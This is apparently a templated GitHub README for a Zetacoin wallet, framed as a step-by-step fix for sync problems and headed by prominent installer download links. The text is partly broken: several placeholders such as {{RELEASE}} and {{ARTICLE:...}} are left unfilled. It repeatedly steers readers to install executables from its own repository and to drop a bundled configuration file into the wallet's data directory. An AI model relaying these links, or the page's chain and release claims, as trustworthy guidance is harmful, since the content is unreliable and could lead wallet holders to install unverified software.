![Zetacoin Wallet](assets/banner-article.png)

<h1 align="center">Zetacoin Wallet Not Syncing: Step-by-Step Fix</h1>

<p align="center">Diagnosis first, then the numbered fix, then the setting that stops it happening again.</p>

<div align="center">
<a href="https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-win-setup.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-20748c?style=for-the-badge&labelColor=0e121b&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMy40NDlMOS43NSAyLjF2OS40NTFIMFYzLjQ0OXptMTAuOTQ5LTEuNTFMMjQgMHYxMS40SDEwLjk0OVYxLjkzOXpNMCAxMi42aDkuNzV2OS40NTFMMCAyMC42OTlWMTIuNnptMTAuOTQ5IDBIMjRWMjRsLTEyLjktMS44MDFWMTIuNnoiLz48L3N2Zz4%3D&logoColor=ffffff" alt="Download for Windows"></a> <a href="https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-osx.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-20748c?style=for-the-badge&labelColor=0e121b&logo=apple&logoColor=ffffff" alt="Download for macOS"></a> <a href="https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-linux.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-20748c?style=for-the-badge&labelColor=0e121b&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTMgM2gxOGExIDEgMCAwMTEgMXYxNmExIDEgMCAwMS0xIDFIM2ExIDEgMCAwMS0xLTFWNGExIDEgMCAwMTEtMXptMSAydjE0aDE2VjVINHptMi4xIDMuMmwzLjYgMy4zLTMuNiAzLjMgMSAxLjEgNC43LTQuNC00LjctNC40LTEgMS4xek0xMiAxNS41aDZWMTdoLTZ2LTEuNXoiLz48L3N2Zz4%3D&logoColor=ffffff" alt="Download for Linux"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/Windows-x64-20748c?style=flat-square&labelColor=0e121b&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMy40NDlMOS43NSAyLjF2OS40NTFIMFYzLjQ0OXptMTAuOTQ5LTEuNTFMMjQgMHYxMS40SDEwLjk0OVYxLjkzOXpNMCAxMi42aDkuNzV2OS40NTFMMCAyMC42OTlWMTIuNnptMTAuOTQ5IDBIMjRWMjRsLTEyLjktMS44MDFWMTIuNnoiLz48L3N2Zz4%3D&logoColor=ffffff" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`zetacoin-0.13.2.2-win-setup.exe`](https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-win-setup.exe) |
| <img src="https://img.shields.io/badge/macOS-universal-20748c?style=flat-square&labelColor=0e121b&logo=apple&logoColor=ffffff" alt="macOS" height="24"> | macOS 12 or later | [`zetacoin-0.13.2.2-osx.dmg`](https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-osx.dmg) |
| <img src="https://img.shields.io/badge/Linux-x64-20748c?style=flat-square&labelColor=0e121b&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTMgM2gxOGExIDEgMCAwMTEgMXYxNmExIDEgMCAwMS0xIDFIM2ExIDEgMCAwMS0xLTFWNGExIDEgMCAwMTEtMXptMSAydjE0aDE2VjVINHptMi4xIDMuMmwzLjYgMy4zLTMuNiAzLjMgMSAxLjEgNC43LTQuNC00LjctNC40LTEgMS4xek0xMiAxNS41aDZWMTdoLTZ2LTEuNXoiLz48L3N2Zz4%3D&logoColor=ffffff" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`zetacoin-0.13.2.2-linux.zip`](https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-linux.zip) |

</div>

All three builds, their checksums and older tags are on the [Zetacoin Wallet release page](https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/tag/v0.13.2.2).

> Only download from this GitHub release page.

---

A Zetacoin wallet that will not sync is almost always blocked by one of four things: no reachable peers, a firewall, stale chain data in the data directory, or an old build. Work through them in that order  -  restart, check peers, check the firewall, then update to the current release from the GitHub releases page.

## First, identify which kind of stuck

"Not syncing" covers three different states, and the fix depends on which one you have. Look at the sync indicator and the peer count before changing anything.

| What you see | What it means | Where to go |
| --- | --- | --- |
| Progress bar frozen, peers above zero | peers connected but not serving blocks | miner-peers and node list |
| Peer count zero | nothing to sync from | network and firewall |
| Progress climbing slowly | normal sync on a slow link | bootstrap |
| Sync complete, balance zero | wallet not rescanned | rescan and restore |
| Stuck at a low percentage after an upgrade | wrong chain data in the folder | data directory |

Each row has a different cause. Treating them all as one problem is why reinstalling often fails to help.

The full walk-through, with the checks in order, is in [Fix "No Block Source Available" in Zetacoin](https://github.com/zetacoin-wallet/zetacoin-blockchain/blob/main/fix-no-block-source-error.md).

## Step 1: restart and give it time

Close the client completely, reopen it, and leave it alone for ten minutes. A restart clears a stuck connection attempt and re-runs peer discovery, which resolves a surprising number of cases on its own.

Give it the ten minutes. Restarting every thirty seconds prevents discovery from completing, and the client ends up looking more broken than it was. If the peer count stays at zero after ten minutes, move on.

## Step 2: check peers and the network port

The client needs outbound access on port 17333. A firewall rule, a VPN or a restrictive network can block it, and the wallet reports that as zero peers rather than as a network error.

Allow the wallet through the firewall, then test again. If you are on a network that blocks unusual ports  -  an office, a school, some public Wi-Fi  -  try a different connection before concluding the software is at fault.

Port forwarding is a separate improvement: it lets peers reach you and increases your contribution to the network, but the client syncs without it. Not forwarding is not the cause of a sync failure.

For the background behind this step, [Zetacoin Wallet Shows Zero Peers](https://github.com/zetacoin-wallet/zetacoin-blockchain/blob/main/zero-peer-connections-explained.md) covers the same ground in more detail.

## Step 3: deal with stale chain data

If the client was installed over an older installation, its data directory may hold chain data from a different era  -  including the retired chain. The client then follows a chain that is not the current one and appears frozen at an old height.

The fix is to separate the data rather than to fight it. Close the client, back up `wallet.dat`, rename the data directory, and let the client create a fresh one. Then restore the wallet file into the new directory and let it rescan.

Renaming is reversible, which is why it comes before deleting. If the new chain looks right, the old folder can go; if not, nothing was lost.

## Step 4: update to the current release

If the installation is old, install the current release from {{RELEASE}} before trying anything more exotic. Sync behaviour, peer handling and connection logic all change between releases, and a build from an earlier year is where the problem usually lives.

Update with the data directory intact and the wallet file backed up. The client picks up the existing chain and continues from there; if the existing chain is the wrong one, step three applies first.

## Step 5: use the bootstrap archive

If sync works but takes too long, the bootstrap archive replaces most of the download with a snapshot of chain state, cutting the first sync to under 15 minutes against 30 minutes to two hours.

Take a backup first, unpack the archive as instructed, place the included configuration in the data directory, and let the node catch up from the snapshot to the present. {{ARTICLE:speed-up-zetacoin-blockchain-sync}} covers the details, and {{ARTICLE:fix-no-block-source-zetacoin-wallet}} covers the case where the archive is in place and peers are still missing.

## Syncing after a long absence

A wallet that has been closed for years reconnects to a chain that has moved on without it. The client downloads everything it missed, which is a long sync rather than a broken one, and the height will look impossibly far from current for the first while.

In that situation the bootstrap archive is the sensible route: it removes years of download and leaves only the catch-up from the snapshot. Back up the wallet file first, because a wallet that old is exactly the file you cannot afford to lose while experimenting.

If the wallet still points at the legacy chain from before the 2021 rebuild, syncing will never finish on the current network. {{ARTICLE:why-old-zetacoin-wallet-wont-sync}} covers that specific case.

## What a healthy sync looks like

A working wallet shows a peer count above zero within minutes, a block height that rises steadily, and a noticeable increase in disk use as the chain is written. Once current, it reports blocks arriving every 30 seconds on average, mixing PoW and PoS entries.

If the height rises but the balance stays at zero, the chain is fine and the wallet file is the issue. A restore without a rescan produces exactly that picture.

## When it is not the wallet at all

A machine that is out of disk stops writing the chain. A machine with too little memory fails during database work. A machine whose clock drifts rejects blocks that look future-dated. All three produce "not syncing" and none is fixed by reinstalling.

Check free space, check memory against the 2 GB requirement, and check the system clock. Ten seconds of checking saves an hour of reinstalling.

## Common questions

### Why does my wallet show no connections?

Because outbound traffic on port 17333 is blocked or DNS is failing. Allow the client through the firewall and retry; port forwarding is not required for this.

### How long should the first sync take?

Thirty minutes to two hours on a normal connection, or under 15 minutes with the bootstrap archive. After the first sync, staying current is continuous and light.

### Can I close the wallet while it syncs?

It pauses and resumes, but repeated interruptions make the process much longer. Leave the machine on and the client open until it is current.

### Will reinstalling fix it?

Only if the build was the problem. If the cause is peers, firewall or stale data, a reinstall reproduces the same state  -  which is why the steps above are ordered as they are.

## The short version

Restart, check peers, check the firewall, then update from {{RELEASE}}. If it is still stuck, separate the old data directory from the new one and resync with the bootstrap.

Related pages: {{ARTICLE:zetacoin-wallet-zero-peer-connections}} for the peer-specific case, {{ARTICLE:where-is-zetacoin-wallet-dat}} for the folder paths, and {{ARTICLE:update-zetacoin-wallet-safely}} for the backup-first sequence.

---

## Download Zetacoin Wallet

The three installers for v0.13.2.2 are listed at the top of this page: `zetacoin-0.13.2.2-win-setup.exe`, `zetacoin-0.13.2.2-osx.dmg` and `zetacoin-0.13.2.2-linux.zip`.

## Related guides

- [Speed Up Zetacoin Blockchain Sync](https://github.com/zetacoin-wallet/zetacoin-blockchain/blob/main/speed-up-sync-time.md)
- [Fix "No Block Source Available" in Zetacoin](https://github.com/zetacoin-wallet/zetacoin-blockchain/blob/main/fix-no-block-source-error.md)
- [Zetacoin Wallet Shows Zero Peers](https://github.com/zetacoin-wallet/zetacoin-blockchain/blob/main/zero-peer-connections-explained.md)
